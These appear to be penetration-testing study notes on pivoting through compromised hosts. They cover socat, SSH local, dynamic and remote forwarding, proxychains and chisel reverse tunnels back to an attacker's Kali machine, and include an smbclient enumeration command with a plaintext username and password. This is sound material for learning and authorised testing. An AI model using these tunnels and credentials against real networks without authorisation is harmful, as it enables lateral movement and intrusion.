### Socat
`socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22`

### SSH
Local  
> case A: access to a port only open on the compromised host
> 	link  local port to port of target host
>> `ssh -L lport:localhost:rport  username@compromisedIP`
>
> case B:  access to a port on 3rd host with the same subdomain network of compromised host
> 		link local port to 3rd target host port
> > `ssh -L localhost:lport:3rdhostIP:rport username@compromisedIP`
> >
> case C: Host A (kali) → Host B (you own and run ssh -L) → Host C (where the SSH connection authenticates) → Host D: (the target).
> > `ssh -N -L 0.0.0.0:xxxx:<host_d_ip>:xxx <user>@<host_c_ip>` // run in host b

Dynamic
```
//use socks5 to forward multyple ports, but for some applications needs proxychain4.
Host A (kali) → Host B (you own and run ssh -L) → Host C (where the SSH connection authenticates) → Host D: (the target)

ssh -N -D 0.0.0.0:9999 user@hostc  //run on hostb

//add this into /etc/proxychains4 in kali
socks5 hostb port

proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234   //in kali,, also lie nmap
```

Remote
//use in kali as the target host's port is reachable locally 
> case A: let compromised host access to a remote port, localhost is able to visit, but  compromised host cannot, in another word, this port only open for localhost
> > `ssh -R:port(compromised):localhost:port(target) username@compromisedIP`
> 
>  case B:  verse vesa, 
>  > `ssh -N -R 127.0.0.1:kali_port:targetIP(host_c):target_port kali@kali_IP`
//for remote dynamic, change /etc/proxychain4
>  > socks5 127.0.0.1 port
>  >

### Chisel
- A: let compromised host access to a remote port, localhost is able to visit, but  compromised host cannot, in another word, this port only open for localhost
 server set on localhost, this listening IP is used for create tunnel <br>
> on compromised host:<br>
> `chisel server -p xxx`<br>
> on local host: <br>
> `chisel client serverIP:port(server listening) port(local host):target domainname(rIP):rport`<br>
>  Access: `curl http://localhost:port(on compromised)`

- B: localhost access a port open in the subnetwork where compromised host sits<br>
>  server also set on localhost, this listening IP is used for create tunnel:<br>
>	`chisel server -p xxx --reverse`<br>
> on compromised host:<br>
>	`chisel client localhostIP:port(you are listening) R:port(localhost):3edhostIP:port(3rd)`<br>  if the 3rdhost is the compromised one, set it as 127.0.0.1
>
> on localhost, access to port 3rd:<br>
>	`curl http://localhost:port(localhost)`

### iox
